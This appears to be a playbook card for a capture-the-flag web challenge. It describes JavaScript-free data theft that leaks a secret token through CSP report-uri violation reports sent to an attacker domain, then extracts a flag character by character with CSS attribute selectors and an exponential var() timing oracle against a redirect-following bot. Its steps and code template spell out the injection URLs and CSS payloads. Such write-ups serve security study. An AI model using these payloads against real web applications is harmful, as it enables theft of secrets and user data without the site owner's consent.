---
name: csp_report_uri_secret_leak_css_attr_selector_blind_exfil
vuln_type: xss
sub_technique: csp_css_attribute_selector_blind
category: exploitation
safety_level: cautious
tags:
- csp
- css-injection
- import
- attribute-selector
- blind
- redos
- bot
---

# Csp Report-Uri Secret Leak + Css Attribute Selector Blind Flag Exfil + Exponential Var() Redos

## When to Apply

A page has CSP with `style-src: http://127.0.0.1/secret.php` and `report-uri` pointing to the attacker. An `@import` from secret.php loads a stylesheet containing a secret token. CSP violations on blocked URIs leak the secret via report-uri. The flag is rendered in an `<h1>` attribute. CSS `h1[flag^='prefix']` with exponential `var()` nesting causes page-load delay (timing oracle) when matched.

## Prerequisites

- CSP style-src allowing localhost/secret.php
- CSP report-uri set to attacker domain
- Flag value in HTML attribute (inspectable by CSS)
- Bot that follows meta-refresh redirects

## Steps

1. Serve page with `<link rel=stylesheet href='http://127.0.0.1/secret.php?whatUwant=@import+"'>`
2. CSP report contains blocked-uri → secret token extracted.
3. For each character position, redirect bot to:
   `http://127.0.0.1:8080/flag?secret=TOKEN&text=<style>h1[flag^="PREFIX+CHAR"]{--a:url(/?1),...;--b:var(--a),...;...}</style><meta http-equiv=refresh ...>`
4. If prefix matches, exponential var() expansion causes significant delay.
5. Timeout / no-redirect-callback indicates match. Move to next char.
6. When no match triggers delay, previous char was the last → flag complete.

## Code Template

```
csp_header = {'style-src': 'http://127.0.0.1/secret.php', 'report-uri': attacker_url}
css = f'h1[flag^="{prefix}{char}"]{{--a:url(/?1),url(/?1),...;--b:var(--a),...;...}}'
redirect_url = f'http://127.0.0.1:8080/flag?secret={secret}&text={urlencode(css_page)}'
```

## Examples

### Example 1

- **secret_leak**: CSP blocked-uri in report
- **oracle**: exponential var() nesting → page load delay
- **charset**: {_} + ascii_letters

No JavaScript execution needed (JS-Less). The entire exfiltration is done via CSS attribute selectors and CSP reports. The exponential var() technique creates a reliable timing side-channel.
